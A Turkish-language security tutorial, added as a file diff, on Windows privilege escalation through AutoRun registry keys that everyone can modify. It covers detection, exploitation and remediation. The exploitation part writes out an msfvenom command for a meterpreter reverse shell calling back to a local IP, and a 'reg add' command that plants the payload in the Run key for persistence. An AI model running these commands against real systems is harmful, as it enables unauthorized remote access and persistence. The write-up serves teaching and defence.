@@ -1,0 +1,102 @@
+I"�<h2 id="özet">Özet</h2>
+
+<p>Windows sistemlerde yanlış yapılandırılmış kayıt defteri kayıtları bulunabilir. Standart kurulumlarda sıklıkla karşılaşılan bir durum olmasa da kullanıcılar bazen izinleri yanlış yapılandırarak, kötü niyetli kişilere yeni ayrıcalıklar elde etmek için bir yol açmış olabilirler. Bazen bu izinler kullanılarak yeni ayrıcalıklar elde edilebilir.</p>
+
+<h2 id="detay">Detay</h2>
+
+<p>Özetle bazı anahtarlar yönetici olmayan kullanıcılar tarafından değiştirilebilir olduğunda bu anahtarlar manipüle edilerek sistemde yetki yükseltilebilir ve sistemde kalıcılık sağlanabilir.</p>
+
+<p>Örnek olarak AutoRun özelliğini aktifleştiren anahtarlar verilebilir. Aşağıda sistemin her açılışında otomatik olarak başlatacağı uygulamaların belirlendiği kayıt bölümü olan Run kaydının herkes tarafından düzenlenebildiği gösterilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/1.png" alt="" />
+</p>
+
+<h2 id="bulunması">Bulunması</h2>
+
+<p>Yanlış yapılandırılmış kayıt defteri izinlerini otomatik olarak bulmak için DazzleUp kullanılabilir. DazzleUp’ın yanlış yapılandırma için oluşturduğu çıktının ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/2.png" alt="" />
+</p>
+
+<p>Yanlış yapılandırılmış kayıt defteri iznini bulmak için sysinternal araçlarından olan accesschk.exe kullanılabilir. HKLM altında yanlış yapılandırılmış bir kayıt bulmak için;</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Accesschk64.exe</span><span class="w"> </span><span class="err">“</span><span class="nx">Everyone</span><span class="err">”</span><span class="w"> </span><span class="nt">-kvuqsw</span><span class="w"> </span><span class="nx">HKLM\</span><span class="w">
+</span></code></pre></div></div>
+<p>komutunu kullanarak Everyone’ın değişiklik yapma iznine sahip olduğu tüm kayıtları listeleyebiliriz. Aşağıda yanlış yapılandırılmış kayıt gösterilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/3.png" alt="" />
+</p>
+
+<p>Yanlış yapılandırılmış kaydı detaylı incelemek için;</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Get-Acl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Format-List</span><span class="w">
+</span></code></pre></div></div>
+<p>komutu kullanılabilir.
+Ekran görüntüsünden görüldüğü üzere ilgili kayıt NT AUTHORITY\SYSTEM grubuna dahil olup <strong>Everyone</strong> tarafından tam erişime sahip.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/4.png" alt="" />
+</p>
+
+<h2 id="i̇stismar-edilmesi">İstismar Edilmesi</h2>
+<p>Zararlı yazılım üretilerek sisteme yüklenecektir. Zararlının üretildiğine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> windows <span class="nt">-a</span> x64 <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.6.182 <span class="nv">LPORT</span><span class="o">=</span>445 <span class="nt">-f</span> exe <span class="nt">-o</span> cmd.exe
+</code></pre></div></div>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/5.png" alt="" />
+</p>
+
+<p>İlgili dosyanın hedef makineye daha önceden elde edilmiş bir oturum üzerinden yüklenmesine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/6.png" alt="" />
+</p>
+
+<p>Bu kayıt bölümünde herkes değişiklik yapabildiği için;</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="err">“</span><span class="nx">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><span class="err">”</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">Insecure</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="err">“</span><span class="nx">C:\Users\test\Desktop\cmd.exe</span><span class="err">”</span><span class="w">
+</span></code></pre></div></div>
+<p>komutunu girerek zararlı yazılımı her oturum açılışında çalıştırılacak şekilde ayarlamış bulunuyoruz. Anahtara zararlı yazılımın tam yolunun verildiğine dair ekran görüntüsü aşağıda verilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/7.png" alt="" />
+</p>
+
+<p>Sonraki oturum açılışında, oturum açan kullanıcı ayrıcalıklarında uzaktan erişim elde edilecektir. Administrator kullanıcısı oturum açtığında elde edilen uzaktan erişim oturumu aşağıda ki ekran görüntüsünde gösterilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/8.png" alt="" />
+</p>
+
+<h2 id="çözüm">Çözüm</h2>
+
+<p>Hatalı yapılandırmayı gidermek için, yanlış yapılandırılmış kaydın izinler bölümünde düzenleme yapılmalıdır. İzinlerin nereden değiştirileceği aşağıda ki ekran görüntülerinde gösterilmiştir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/9.png" alt="" />
+</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/10.png" alt="" />
+</p>
+
+<p>Yanlış yapılandırmanın düzeldiğine dair ekran görüntüsü aşağıda verilmitir.</p>
+
+<p align="center">
+	<img src="/images/modifiable_registry_autoRun_keys_ss/11.png" alt="" />
+</p>
+
+<h2 id="kaynakça">Kaynakça</h2>
+
+<ul>
+  <li>https://en.wikipedia.org/wiki/Windows_Registry</li>
+  <li>https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys</li>
+  <li>https://github.com/hlldz/dazzleUP</li>
+  <li>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</li>
+</ul>
+:ET
